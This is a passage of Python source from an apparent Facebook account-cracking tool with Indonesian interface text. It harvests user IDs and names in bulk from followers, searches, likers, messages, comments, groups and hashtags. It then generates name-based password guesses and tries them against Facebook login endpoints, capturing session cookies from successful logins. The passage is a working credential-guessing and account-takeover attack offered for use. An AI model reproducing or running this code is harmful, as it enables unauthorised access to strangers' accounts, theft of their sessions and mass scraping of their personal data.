        jum = open(file_dump,'r').read().splitlines()
        print('       %s[%s•%s] %sBerhasil Dump %s%s %sID'%(J,P,J,P,J,str(len(jum)),P))
        print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
    except Exception as e:kecuali(e)

###----------[ DUMP ID FOLLOWERS ]---------- ###
def main_folls():
    global file_dump,cookie
    try:
        token  = open('login/token.json','r').read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
    except:
        print('\n%s[%s•%s] %sCookies Invalid %s!%s\n'%(M,P,M,P,M,P))
        time.sleep(3)
        login()
    id = input('       %s[%s•%s] %sID Target : %s'%(J,P,J,P,J))
    url = ('https://graph.facebook.com/%s/subscribers?limit=10000&access_token=%s'%(id,token))
    file_dump = 'dump/%s.json'%(id)
    try:os.remove(file_dump)
    except:pass
    open(file_dump,'w').write('')
    exec_folls(url,token,file_dump)
    print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(file_dump,'r').read().splitlines()),P))
    print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
def exec_folls(url,token,file):
    print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(file,'r').read().splitlines()),P), end='');sys.stdout.flush()
    with requests.Session() as xyz:
        try:
            x = xyz.get(url,cookies=cookie)
            a = json.loads(x.text)
            for b in a['data']:
                try:
                    f = ('%s=%s\n'%(b['id'],b['name']))
                    if f in open(file,'r').read():continue
                    else:open(file,'a+').write(f)
                except Exception as e:continue
            y = par(x.text,'html.parser')
            n = re.findall('"after":"(.*?)"},',str(y))[0]
            next = ('https://graph.facebook.com/v1.0/100009340646547/subscribers?access_token=%s&limit=5000&after=%s'%(token,n))
            exec_folls(next,token,file)
        except KeyboardInterrupt:pass
        except (IndexError,TypeError,IOError,KeyError,AttributeError):pass

###----------[ DUMP ID NAME ]---------- ###
class namee:
    def __init__(self):
        global file_dump, urutan_crack
        urutan_crack = '0'
        try:cookie = {'cookie':open('login/cookie.json','r').read()}
        except Exception as e:kecuali(e)
        print('       %s[%s•%s] %sContoh : dapunta,denventa,anita'%(J,P,J,P))
        put = input('       %s[%s•%s] %sNama Target : %s'%(J,P,J,P,J)).split(',')
        data = []
        self.file_dump = ('dump/%s.json'%(put[0]))
        file_dump = self.file_dump
        open(self.file_dump,'w').write('')
        common = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
        for set1 in put:
            data.append(set1)
            for set2 in common:data.append(set2+' '+set1)
        for set3 in data:url = 'https://mbasic.facebook.com/search/people/?q='+set3;self.exec(url,cookie)
        self.lanjut()
    def exec(self,url,cookie):
        try:
            with requests.Session() as xyz:
                req = xyz.get(url,cookies=cookie)
                pra = par(req.content,'html.parser')
                spam = pra.find_all('h2')[0]
                if 'Anda Diblokir Sementara' in spam.text:print("\r       %s[%s•%s] %sAkun Anda Terkena Spam %s!%s"%(M,P,M,P,M,P), end='');sys.stdout.flush()
                else:print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.file_dump,'r').read().splitlines()),P), end='');sys.stdout.flush()
                for temu in pra.find_all('a',href=True):
                    if "<img alt=" in str(temu):
                        if "home.php" in str(temu["href"]):continue
                        else:
                            try:
                                if 'profile.php' in str(temu["href"]):
                                    find = re.findall('"/profile\.php\?id=(.*?)&"',str(temu))[0]
                                    if len(find) !=0:
                                        id   = ''.join(find)
                                        nama = temu.find("img").get("alt").replace(", profile picture","")
                                        file = open(self.file_dump,'r').read()
                                        if id in file:continue
                                        else:open(self.file_dump,'a+').write('%s=%s\n'%(id,nama))
                                elif 'refid' in str(temu["href"]):
                                    find = re.findall("/(.*?)\?",str(temu))[0]
                                    if len(find) !=0:
                                        id   = convert_id(''.join(find))
                                        kat  = id.split('.')[0] + '.' + id.split('.')[1]
                                        nama = temu.find("img").get("alt").replace(", profile picture","")
                                        file = open(self.file_dump,'r').read()
                                        if id in file:continue
                                        else:
                                            if kat in file:continue
                                            else:open(self.file_dump,'a+').write('%s=%s\n'%(id,nama))
                            except (IndexError,ValueError,IOError):continue
                            except KeyboardInterrupt:exit(self.lanjut())
                for tamu in pra.find_all('a',href=True):
                    if 'Lihat Hasil Selanjutnya' in tamu.text:new_url = tamu['href'];self.exec(new_url,cookie)
        except KeyboardInterrupt:exit(self.lanjut())
    def lanjut(self):
        print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.file_dump,'r').read().splitlines()),P))
        print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
        system_login();metode();addpass();crack()

###----------[ DUMP ID LIKERS ]---------- ###
def main_likers():
    global _react_type_, file_dump, urutan_crack
    urutan_crack = '0'
    try:
        cookie = {'cookie':open('login/cookie.json','r').read()}
        print('       %s[%s•%s] %sContoh : 2089611468021009'%(J,P,J,P))
        _query_ = input('       %s[%s•%s] %sID Postingan : %s'%(J,P,J,P,J))
        print('')
    except Exception as e:kecuali(e)
    tampilan_likers = f'''    {J2}[{A2}1{J2}] {P2}Like   {J2}[{A2}3{J2}] {P2}Wow    {J2}[{A2}5{J2}] {P2}Sad     {J2}[{A2}7{J2}] {P2}Care
    {J2}[{A2}2{J2}] {P2}Love   {J2}[{A2}4{J2}] {P2}Haha   {J2}[{A2}6{J2}] {P2}Angry   {J2}[{A2}8{J2}] {P2}All'''
    printer(Panel(tampilan_likers,title=f'{J2}[ {P2}Tipe React {J2}]',subtitle=f'{A2}┌─ {J2}[ {P2}Pilih {J2}]',subtitle_align='left',width=54,padding=1,style='#FF8F00'))
    rt = input('   %s└──> %s'%(A,J))
    if rt in ['1','01','a']:_react_type_='1'
    elif rt in ['2','02','b']:_react_type_='2'
    elif rt in ['3','03','c']:_react_type_='3'
    elif rt in ['4','04','d']:_react_type_='4'
    elif rt in ['5','05','e']:_react_type_='7'
    elif rt in ['6','06','f']:_react_type_='8'
    elif rt in ['7','07','g']:_react_type_='16'
    elif rt in ['8','08','h']:_react_type_='0'
    else:exit()
    _file_ = _query_+'.json'
    file_dump = _file_
    try:os.remove(_query_+'.json')
    except:pass
    open(_file_,'w')
    _url_ = ('https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier='+_query_)
    scrape_likers(cookie,_url_,_file_)
    print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(_file_,'r').read().splitlines()),P))
    print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
def scrape_likers(_dapunta_,_url_,_file_):
    _ses_ = requests.Session()
    _url_load_ = _ses_.get(_url_,cookies=_dapunta_,headers=header_grup).text.encode("utf-8")
    _ses_par_ = par(_url_load_,'html.parser')
    print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(_file_,'r').read().splitlines()),P), end='');sys.stdout.flush()
    try: 
        for _isi_ in _ses_par_.find_all('h3'):
            for _id_ in _isi_.find_all('a',href=True):
                try:
                    if "profile.php" in _id_.get("href"):
                        _a_ = _id_.get("href").split('=')[1]
                        __id__ = _id_.text
                        open(_file_,'a+').write(_a_+'='+__id__+'\n')
                        #print(_a_+'='+__id__)
                    else:
                        _a_ = _id_.get("href").split('/')[1]
                        __id__ = _id_.text
                        open(_file_,'a+').write(_a_+'='+__id__+'\n')
                        #print(_a_+'='+__id__)
                except:continue
        for _lanjut_ in _ses_par_.find_all("a",href=True):
            if "Lihat Selengkapnya" in _lanjut_.text:
                while True:
                    try:scrape_likers(_dapunta_,"https://mbasic.facebook.com/"+_lanjut_.get("href").replace('reaction_type=0','reaction_type='+_react_type_),_file_);break
                    except Exception as e:pass
    except KeyboardInterrupt:pass

###----------[ DUMP ID MESSAGE ]---------- ###
class message:
    def __init__(self):
        global file_dump, urutan_crack
        urutan_crack = '0'
        try:
            url    = 'https://mbasic.facebook.com/messages'
            token  = open('login/token.json','r').read()
            cookie = {'cookie':open('login/cookie.json','r').read()}
            self.myaccount = json.loads(requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie).text)["id"]
            self.file_dump = ('dump/message.json')
            file_dump = self.file_dump
            open(self.file_dump,'w').write('')
        except Exception as e:kecuali(e)
        self.exec(url,cookie)
        print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.file_dump,'r').read().splitlines()),P))
        print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
    def exec(self,url,cookie):
        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.file_dump,'r').read().splitlines()),P), end='');sys.stdout.flush()
        try:
            with requests.Session() as xyz:
                req = xyz.get(url,cookies=cookie)
                pra = par(req.content,'html.parser')
                for tata in pra.find_all('a',href=True):
                    if '/messages/read/?tid=cid.c' in tata['href']:
                        if 'Pengguna Facebook' in str(tata):continue
                        else:
                            idzx = re.findall('cid\.c\.(.*?)%3A(.*?)&',str(tata))
                            for id in list(idzx.pop()):
                                try:
                                    if id == self.myaccount:continue
                                    else:
                                        nama = tata.text
                                        if nama == '':continue
                                        else:open(self.file_dump,'a+').write('%s=%s\n'%(id,nama))
                                except:continue
                    else:continue
                for tete in pra.find_all('a',href=True):
                    if 'Lihat Pesan Sebelumnya' in tete.text:
                        new_url = 'https://mbasic.facebook.com' + tete['href']
                        self.exec(new_url,cookie)
        except KeyboardInterrupt:pass

###----------[ DUMP ID COMMENTS ]---------- ###
class komen:
    def __init__(self):
        global file_dump, urutan_crack
        urutan_crack = '0'
        try:
            cookie = {'cookie':open('login/cookie.json','r').read()}
            print('       %s[%s•%s] %sContoh : 2089611468021009'%(J,P,J,P))
            put = input('       %s[%s•%s] %sID Postingan : %s'%(J,P,J,P,J))
            url = 'https://mbasic.facebook.com/'+put
            self.file_dump = ('dump/%s.json'%(put))
            file_dump = self.file_dump
            open(self.file_dump,'w').write('')
        except Exception as e:kecuali(e)
        self.exec(url,cookie)
        print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.file_dump,'r').read().splitlines()),P))
        print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
    def exec(self,url,cookie):
        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.file_dump,'r').read().splitlines()),P), end='');sys.stdout.flush()
        try:
            with requests.Session() as xyz:
                req = xyz.get(url,cookies=cookie)
                pra = par(req.content,'html.parser')
                for x,y,z in re.findall('<h3><a class=\".*?\" href="(.*?)">(.*?)</a></h3><div class=\".*?\">(.*?)</div><div class=\".*?\">',str(pra)):
                    self.f = open(self.file_dump,'r').read()
                    if 'profile.php' in str(x):u  = str(x).split('=')[1].split('&')[0]
                    else:ud = str(x).split('?')[0].replace('/','');u  = convert_id(ud)
                    try:
                        if str(u) in str(self.f):continue
                        else:open(self.file_dump,'a+').write('%s=%s\n'%(u,str(y)))
                    except:continue
                for i in pra.find_all('a'):
                    if 'Lihat komentar sebelumnya' in i.text:
                        new_url = 'https://mbasic.facebook.com' + i['href']
                        self.exec(new_url,cookie)
        except KeyboardInterrupt:pass

###----------[ DUMP ID GROUP ]---------- ###
class grup:
    def __init__(self):
        global urutan_crack
        urutan_crack = '0'
        self.datagrup = {}
        self.looping  = 0
        try:cookie = {'cookie':open('login/cookie.json','r').read()}
        except Exception as e:kecuali(e)
        self.main_grup(cookie)
    def main_grup(self,cookie):
        print('')
        tamp_grup1 = f"""            {J2}[{A2}1{J2}] {P2}Bergabung   {J2}[{A2}2{J2}] {P2}Nama   {J2}[{A2}3{J2}] {P2}ID"""
        printer(Panel(tamp_grup1,title=f'{J2}[ {P2}Grup {J2}]',width=54,title_align='left',style='#FF8F00'))
        ty = input('   %s└──> %s'%(A,J))
        if ty in ['1','01','a']:
            print('')
            self.file = ('dump/mygroup.json')
            open(self.file,'w').write('')
            url= 'https://mbasic.facebook.com/groups/?seemore&refid=1000'
            self.cari_gabung(url,cookie)
        elif ty in ['2','02','b']:
            put = input('       %s[%s•%s] %sMasukkan Nama Grup : %s'%(J,P,J,P,J))
            print('')
            self.file = ('dump/%s.json'%(put.replace(' ','_')))
            open(self.file,'w').write('')
            url = 'https://mbasic.facebook.com/search/groups/?q=' + put
            self.cari_nama(url,cookie)
        elif ty in ['3','03','c']:
            self._id_ = input('       %s[%s•%s] %sMasukkan ID Grup : %s'%(J,P,J,P,J))
            self._pil_ = True
            print('')
            self.second_grup(cookie)
        else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
    def cari_gabung(self,url,cookie):
        with requests.Session() as xyz:
            req = xyz.get(url,cookies=cookie)
            pra = par(req.content,'html.parser')
            for c in pra.find_all('a'):
                try:
                    if 'mbasic.facebook.com/groups' in str(c):
                        link = str(c['href'])
                        id = re.findall('https://mbasic.facebook.com/groups/(.*?)/',str(link))[0]
                        dt = self.data_grup(id,cookie)
                        if 'Anda Diblokir Sementara' in str(dt):
                            self.looping += 1
                            print("\r       %s[%s•%s] %sAkun Anda Terkena Spam! %s[%s%s%s]%s"%(M,P,M,P,M,P,str(self.looping),M,P), end='');sys.stdout.flush()
                        else:
                            self.looping += 1
                            tar = str(self.looping)
                            tamp_grup2 = f"{A2} • ID Grup : {id}{dt}"
                            printer(Panel(tamp_grup2,title=f'{J2}[ {P2}{tar} {J2}]',width=54,title_align='left',style='#FF8F00'))
                            self.datagrup.update({str(self.looping):id})
                    else:continue
                except KeyboardInterrupt:pass
    def cari_nama(self,url,cookie):
        try:
            with requests.Session() as xyz:
                req = xyz.get(url,cookies=cookie)
                pra = par(req.content,'html.parser')
                for c in pra.find_all('a'):
                    if 'mbasic.facebook.com/groups' in str(c):
                        link = str(c['href'])
                        id = re.findall('https://mbasic.facebook.com/groups/(.*?)/',str(link))[0]
                        if id not in open(self.file,'r').read():
                            open(self.file,'a+').write(id+'\n')
                            id = open(self.file,'r').read().splitlines()[-1]
                            dt = self.data_grup(id,cookie)
                            if 'Grup Privat' in str(dt):continue
                            elif 'Anda Diblokir Sementara' in str(dt):self.looping += 1;print("\r       %s[%s•%s] %sAkun Anda Terkena Spam! %s[%s%s%s]%s"%(M,P,M,P,M,P,str(self.looping),M,P), end='');sys.stdout.flush()
                            else:
                                self.looping += 1
                                tar = str(self.looping)
                                tamp_grup2 = f"{A2} • ID Grup : {id}{dt}"
                                printer(Panel(tamp_grup2,title=f'{J2}[ {P2}{tar} {J2}]',width=54,title_align='left',style='#FF8F00'))
                                self.datagrup.update({str(self.looping):id})
                        else:continue
                    else:continue
                for c in pra.find_all('a'):
                    if 'Lihat Hasil Selanjutnya' in c.text:
                        new_url = c['href']
                        self.cari_nama(new_url,cookie)
        except KeyboardInterrupt:pass
    def data_grup(self,id,cookie):
        try:
            with requests.Session() as xyz:
                url = 'https://mbasic.facebook.com/groups/'+id
                req = xyz.get(url,cookies=cookie)
                pra = par(req.content,'html.parser')
                try:nama = re.findall('<head><title>(.*?)</title>',str(pra))[0]
                except:nama = ''
                try:tipe = re.findall('</div></h1><div class=\".*?\">(.*?)</div></td></tr></tbody></table></a></td>',str(pra))[0]
                except:tipe = ''
                try:member = re.findall('Anggota</a></td><td class=\".*?\"><span class=\".*?\" id=\".*?\">(.*?)</span></td></tr></tbody></table></li>',str(pra))[0]
                except:member = ''
                zyx = ('\n • Nama : %s\n • Tipe : %s\n • Anggota : %s'%(nama,tipe,member))
                return(zyx)
        except KeyboardInterrupt:
            self._pil_ = False
            exit(self.second_grup(cookie))
    def second_grup(self,cookie):
        global file_dump
        if self._pil_ == True:pro = self._id_
        else:
            coy =  input('   %s└──> %s'%(A,J))
            print('')
            try:pro = self.datagrup[coy]
            except Exception as e:kecuali(e)
        self.files = ('dump/%s.json'%(pro.replace(' ','_')))
        file_dump = self.files
        open(self.files,'w').write('')
        tamp_grup3 = f"""              {J2}[{A2}1{J2}] {P2}ID Member   {J2}[{A2}2{J2}] {P2}ID Post"""
        printer(Panel(tamp_grup3,title=f'{J2}[ {P2}Dump {J2}]',width=54,title_align='left',style='#FF8F00'))
        cuy = input('   %s└──> %s'%(A,J))
        if cuy in ['1','01','a']:
            url_member = 'https://mbasic.facebook.com/browse/group/members/?id=' + pro
            self.dump_member(url_member,cookie)
            print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P))
            print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
            system_login();metode();addpass();crack()
        elif cuy in ['2','02','b']:
            url_grup = 'https://mbasic.facebook.com/groups/' + pro
            self.dump_post(url_grup,cookie)
            print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P))
            print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
            system_login();metode();addpass();crack()
        else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
    def dump_member(self,url,cookie):
        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
        with requests.Session() as xyz:
            try:
                req = xyz.get(url,cookies=cookie)
                pra = par(req.content,'html.parser')
                for pe in pra.find_all('h3'):
                    for po in pe.find_all('a',href=True):
                        try:
                            fel = open(self.files,'r').read()
                            if 'profile.php' in po['href']:
                                id = str(po['href']).split('=')[1]
                                nm = po.text
                                if id in fel:pass
                                else:open(self.files,'a+').write('%s=%s\n'%(id,nm))
                            else:
                                id = str(po['href']).replace('/','')
                                nm = po.text
                                if id in fel:pass
                                else:open(self.files,'a+').write('%s=%s\n'%(id,nm))
                        except Exception as e:continue
                for pa in pra.find_all('a',href=True):
                    if 'Lihat Selengkapnya' in pa.text:
                        new_url = 'https://mbasic.facebook.com' + pa['href']
                        self.dump_member(new_url,cookie)
            except KeyboardInterrupt:pass
    def dump_post(self,url,cookie):
        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
        with requests.Session() as xyz:
            try:
                req = xyz.get(url,cookies=cookie)
                pra = par(req.content,'html.parser')
                for pe in pra.find_all('h3'):
                    for po in pe.find_all('a',href=True):
                        try:
                            fel = open(self.files,'r').read()
                            if 'mbasic.facebook.com' in po['href']:pass
                            elif 'story.php' in po['href']:pass
                            elif 'Halaman' in po.text:pass
                            elif 'profile.php' in po['href']:
                                id = re.findall('profile\.php\?id=(.*?)&',str(po['href']))[0]
                                nm = po.text
                                if id in fel:pass
                                else:open(self.files,'a+').write('%s=%s\n'%(id,nm))
                            else:
                                ud = re.findall('\/(.*?)\/\?refid',str(po['href']))[0]
                                id = convert_id(ud)
                                nm = po.text
                                if id in fel:pass
                                else:open(self.files,'a+').write('%s=%s\n'%(id,nm))
                        except Exception as e:continue
                for pa in pra.find_all('a',href=True):
                    if 'Lihat Postingan Lainnya' in pa.text:
                        new_url = 'https://mbasic.facebook.com' + pa['href']
                        self.dump_post(new_url,cookie)
            except KeyboardInterrupt:pass

class hashtag:
    def __init__(self):
        global file_dump, urutan_crack
        urutan_crack = '0'
        try:cookie = {'cookie':open('login/cookie.json','r').read()}
        except Exception as e:kecuali(e)
        xd = input('       %s[%s•%s] %sCari Hashtag : %s'%(J,P,J,P,J)).replace(' ','')
        url = 'https://mbasic.facebook.com/hashtag/' + xd
        self.files = ('dump/%s.json'%(xd))
        file_dump = self.files
        open(self.files,'w').write('')
        self.dump(url,cookie)
        print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P))
        print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
    def dump(self,url,cookie):
        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
        with requests.Session() as xyz:
            try:
                req = par(xyz.get(url,cookies=cookie).content,'html.parser')
                for x in req.find_all('h3'):
                    for y in x.find_all('a',href=True):
                        try:
                            op = open(self.files,'r').read()
                            if 'mbasic.facebook.com' in y['href']:pass
                            elif 'sub_view' in y['href']:pass
                            elif '/?' in y['href']:pass
                            elif 'profile.php' in y['href']:
                                id = str(re.search('\?id=(.*?)&',y['href']).group(1))
                                nm = str(re.search('>(.*?)<\/a>',str(y)).group(1))
                                if id in op:pass
                                else:open(self.files,'a+').write('%s=%s\n'%(id,nm))
                            else:
                                ud = str(re.search('\/(.*?)\?',y['href']).group(1))
                                id = convert_id(ud)
                                nm = str(re.search('>(.*?)<\/a>',str(y)).group(1))
                                if id in op:pass
                                else:open(self.files,'a+').write('%s=%s\n'%(id,nm))
                        except Exception as e:
                            continue
                for z in req.find_all('a',href=True):
                    if 'Lihat Hasil Selanjutnya' in z.text:self.dump(z['href'],cookie)
            except KeyboardInterrupt:pass

###----------[ LOGIN METHOD ]---------- ###
def system_login():
    global sistem_login
    print('')
    tamp_metode = f"""            {J2}[{A2}1{J2}] {P2}Validate  {J2}[{A2}2{J2}] {P2}Regular  {J2}[{A2}3{J2}] {P2}Log IG"""
    printer(Panel(tamp_metode,title=f'{J2}[ {P2}Metode {J2}]',width=54,title_align='left',style='#FF8F00'))
    ch = input('   %s└──> %s'%(A,J))
    if ch in ['0','00','z']:sistem_login = "nol"
    elif ch in ['1','01','a']:sistem_login = "satu"
    elif ch in ['2','02','b']:sistem_login = "dua"
    elif ch in ['3','03','c']:sistem_login = "tiga"
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()

###----------[ URL LOGIN ]---------- ###
def metode():
    tamp_sistem = f"""            {J2}[{A2}1{J2}] {P2}Free FB   {J2}[{A2}2{J2}] {P2}Mbasic   {J2}[{A2}3{J2}] {P2}Mobile"""
    printer(Panel(tamp_sistem,title=f'{J2}[ {P2}Login {J2}]',width=54,title_align='left',style='#FF8F00'))
    ch = input('   %s└──> %s'%(A,J))
    if ch in ['1','01','a']:open('tool/url_login.json','w').write("free.facebook.com")
    elif ch in ['2','02','b']:open('tool/url_login.json','w').write("mbasic.facebook.com")
    elif ch in ['3','03','c']:open('tool/url_login.json','w').write("m.facebook.com")
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()

###----------[ URUTAN CRACK ]---------- ###
def urut_crack():
    global urutan_crack
    tamp_urutan = f"""            {J2}[{A2}1{J2}] {P2}ID Tua    {J2}[{A2}2{J2}] {P2}ID Muda  {J2}[{A2}3{J2}] {P2}ID Acak"""
    printer(Panel(tamp_urutan,title=f'{J2}[ {P2}Urutan {J2}]',width=54,title_align='left',style='#FF8F00'))
    ch = input('   %s└──> %s'%(A,J))
    if ch in ['1','01','a']:urutan_crack = '0'
    elif ch in ['2','02','b']:urutan_crack = '1'
    elif ch in ['3','03','c']:urutan_crack = '2'
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()

###----------[ GENERATE PASSWORD ]---------- ###
def password(user):
    listpass = []
    if SAKERA != 159403:
        for x in range(0,10000000000000):listpass.append(str(x))
        return listpass
    else:
        try:
            ps = pass_manual1;pp = pass_manual2;na = user.split(" ")
            if len(na) < 2:
                nd = na[0].lower()
                if len(nd)<3:pass
                elif len(nd)==3 or len(nd)==4 or len(nd)==5:listpass.append(nd+"123");listpass.append(nd+"12345")
                else:listpass.append(nd);listpass.append(nd+"123");listpass.append(nd+"12345")
                if pp in ['',' ','  ']:pass
                else:
                    for x in pp.split(','):listpass.append(nd+x)
            else:
                nd = na[0].lower()
                if len(nd)<3:pass
                elif len(nd)==3 or len(nd)==4 or len(nd)==5:listpass.append(nd+"123");listpass.append(nd+"12345")
                else:listpass.append(nd);listpass.append(nd+"123");listpass.append(nd+"12345")
                nb = na[-1].lower()
                if len(nb)<3:pass
                elif len(nb)==3 or len(nb)==4 or len(nb)==5:listpass.append(nb+"123");listpass.append(nb+"12345")
                else:listpass.append(nb);listpass.append(nb+"123");listpass.append(nb+"12345")
                if pp in ['',' ','  ']:pass
                else:
                    for x in pp.split(','):listpass.append(nd+x);listpass.append(nb+x)
            if ps in ['',' ','  ']:
                pass
            else:
                for z in ps.split(','):listpass.append(z)
            listpass.append(user.lower())
            return listpass
        except:return listpass

###----------[ ADD MANUAL PASS ]---------- ###
def addpass():
    global pass_manual1, pass_manual2
    print('')
    print('   %s[%s•%s] %sPass Manual %s[ %s1 Kata %s]'%(J,P,J,P,J,A,J))
    pass_manual1 = input('     %s└─> %s'%(A,J))
    print('   %s[%s•%s] %sPass Manual %s[ %sBelakang Nama %s]'%(J,P,J,P,J,A,J))
    pass_manual2 = input('     %s└─> %s'%(A,J))
    try:os.remove('tool/passmanual.json')
    except:pass
    try:os.remove('tool/passangka.json')
    except:pass
    open('tool/passmanual.json','w').write(pass_manual1)
    open('tool/passangka.json','w').write(pass_manual2)

###----------[ SOURCE LOGIN ]---------- ###

def logger1(user,pasw): #--- Login Validate ---#
    ua = open('tool/useragent.json','r').read()
    url_login = open('tool/url_login.json','r').read()
    with requests.Session() as xyz:
        if ip_log != 1:
            token  = open('login/token.json','r').read()
            cookie = {'cookie':open('login/cookie.json','r').read()}
            with requests.Session() as xyz:
                try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
                except Exception as e:pass
                return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
        else:
            req  = xyz.get(f'https://{url_login}')
            log = {"lsd":re.search('name="lsd" value="(.*?)"',str(req.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),"uid":user,"pass":pasw,"flow":"login_no_pin"}
            head = {"Host":url_login,"origin":"https://"+url_login,"user-agent":ua,"sec-fetch-site":"same-origin"}
            exec = xyz.post(f"https://{url_login}/login/device-based/validate-password/?shbl=0", data=log, headers=head)
            if "c_user" in xyz.cookies.get_dict():return {"status":"ok","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
            elif "checkpoint" in xyz.cookies.get_dict():return {"status":"cp","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
            else:return {"status":"error","email":user,"pass":pasw}

def logger2(user,pasw): #--- Login Regular ---#
    ua = open('tool/useragent.json','r').read()
    url_login = open('tool/url_login.json','r').read()
    with requests.Session() as xyz:
        if ip_log != 1:
            token  = open('login/token.json','r').read()
            cookie = {'cookie':open('login/cookie.json','r').read()}
            with requests.Session() as xyz:
                try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
                except Exception as e:pass
                return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
        else:
            req  = xyz.get(f'https://{url_login}')
            log  = {"lsd":re.search('name="lsd" value="(.*?)"',str(req.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),"email":user,"pass":pasw}
            head = {"Host":url_login,"origin":"https://"+url_login,"user-agent":ua,"sec-fetch-site":"same-origin"}
            exec = xyz.post(f'https://{url_login}/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl', data=log, headers=head)
            if 'c_user' in xyz.cookies.get_dict(): return {"status":"ok","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
            elif 'checkpoint' in xyz.cookies.get_dict(): return {"status":"cp","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
            else: return {"status":"error","email":user,"pass":pasw}

def logger3(user,pasw): #--- Login Instagram ---#
    ua = open('tool/useragent.json','r').read()
    url_login = open('tool/url_login.json','r').read()
    with requests.Session() as xyz:
        if ip_log != 1:
            token  = open('login/token.json','r').read()
            cookie = {'cookie':open('login/cookie.json','r').read()}
            with requests.Session() as xyz:
                try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
                except Exception as e:pass
                return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
        else:
            req  = xyz.get(f'https://{url_login}')
            log  = {"lsd":re.search('name="lsd" value="(.*?)"',str(req.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),"email":user,"pass":pasw}
            head = {"Host":url_login,"origin":"https://"+url_login,"user-agent":ua,"sec-fetch-site":"same-origin"}
            exec = xyz.post(f'https://{url_login}/login/device-based/regular/login/?api_key=124024574287414&skip_api_login=1&signed_next=1&next=https://mbasic.facebook.com/dialog/oauth?app_id=124024574287414&refsrc=deprecated&app_id=124024574287414&lwv=100&refid=9', data=log, headers=head)
            if 'c_user' in xyz.cookies.get_dict(): return {"status":"ok","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
            elif 'checkpoint' in xyz.cookies.get_dict(): return {"status":"cp","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
            else: return {"status":"error","email":user,"pass":pasw}

###----------[ CONVERT COOKIES ]---------- ###
def cvt3(denventa):
    try:cookie = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(denventa['sb'],denventa['datr'],denventa['c_user'],denventa['xs'],denventa['fr']))
    except:cookie = 'denventagantengbanget'
    return(str(cookie))

